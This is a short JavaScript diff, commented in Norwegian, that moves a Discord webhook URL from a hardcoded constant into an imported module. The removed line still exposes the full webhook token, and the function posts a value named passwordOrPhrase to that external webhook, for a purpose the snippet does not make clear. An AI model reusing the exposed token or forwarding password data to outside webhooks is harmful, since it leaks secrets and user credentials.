@@ -1,4 +1,5 @@
 //Denne funsjonen kjører async og sender "alert" til webHook
+import { webhookURL } from "../webHookURL.js";
 export async function sendAlertToDiscordWebhook(passwordOrPhrase) {
   try {
     await fetch(webhookURL, {
@@ -15,6 +16,3 @@ export async function sendAlertToDiscordWebhook(passwordOrPhrase) {
     console.error("Failed to send alert to webhook:", error.message);
   }
 }
-
-const webhookURL =
-  "https://discord.com/api/webhooks/1090757975519531088/orFzwKFhZU6t3LlvQQigH73AiTyb8vYRW-58ShHY1YsZN8Au5EPp0D3GvqkN7I2cepMq";
